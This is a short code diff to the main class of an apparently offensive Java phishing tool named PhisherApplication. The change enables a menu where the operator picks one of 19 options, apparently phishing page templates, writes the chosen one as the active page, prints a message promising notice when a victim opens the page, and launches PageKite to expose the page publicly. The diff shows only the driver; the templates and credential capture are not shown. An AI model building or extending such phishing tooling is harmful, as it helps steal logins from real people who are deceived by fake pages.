@@ -13,23 +13,24 @@ import java.util.Scanner;
 public class PhisherApplication {
 
     public static void main(String[] args) {
-        Command.executePageKite();
-//        Banner.printBanner();
-//        Banner.printOptions();
-//
-//        Scanner sc = new Scanner(System.in);
-//        System.out.print("\u001b[38;5;82m"+"Enter your choice: ");
-//        int choice = sc.nextInt();
-//
-//        while (choice > 19 || choice < 1) {
-//            System.out.print("Enter a valid choice: ");
-//            choice = sc.nextInt();
-//        }
-//
-//        Operations.writeActiveFile(Constants.options.get(choice - 1));
+
+        Banner.printBanner();
+        Banner.printOptions();
+
+        Scanner sc = new Scanner(System.in);
+        System.out.print("\u001b[38;5;82m"+"Enter your choice: ");
+        int choice = sc.nextInt();
+
+        while (choice > 19 || choice < 1) {
+            System.out.print("Enter a valid choice: ");
+            choice = sc.nextInt();
+        }
+
+        Operations.writeActiveFile(Constants.options.get(choice - 1));
 //        SpringApplication.run(PhisherApplication.class, args);
-//
-//        System.out.println("\n\nWill notify here if anyone opens your page\n");
+
+        System.out.println("\n\nWill notify here if anyone opens your page\n");
+        Command.executePageKite();
     }
 
 }
